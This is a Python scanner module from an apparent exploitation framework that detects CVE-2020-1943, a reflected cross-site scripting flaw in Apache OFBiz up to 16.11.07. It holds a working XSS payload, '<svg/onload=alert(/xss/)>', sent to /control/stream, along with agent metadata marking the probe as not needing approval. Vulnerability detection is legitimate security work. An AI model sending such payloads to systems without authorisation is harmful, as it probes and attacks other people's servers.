#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache OFBiz 16."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache OFBiz <=16.11.07 - Cross-Site Scripting Detection',
        'description': 'Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting because data sent with contentId to /control/stream is not sanitized.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'apache', 'xss', 'ofbiz', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://lists.apache.org/thread.html/rf867d9a25fa656b279b16e27b8ff6fcda689cfa4275a26655c685702%40%3Cdev.ofbiz.apache.org%3E',
            'https://s.apache.org/pr5u8',
            'https://lists.apache.org/thread.html/r034123f2767830169fd04c922afb22d2389de6e2faf3a083207202bc@%3Ccommits.ofbiz.apache.org%3E',
            'https://lists.apache.org/thread.html/r8efd5b62604d849ae2f93b2eb9ce0ce0356a4cf5812deed14030a757@%3Cdev.ofbiz.apache.org%3E',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-1943',
        ],
        'cve': 'CVE-2020-1943',
    }

    def run(self):
        r = self.http_request(method="GET", path='/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<svg/onload=alert(/xss/)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Apache OFBiz <=16.11.07 - Cross-Site Scripting detected",
                path='/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E',
            )
            return True
        return False

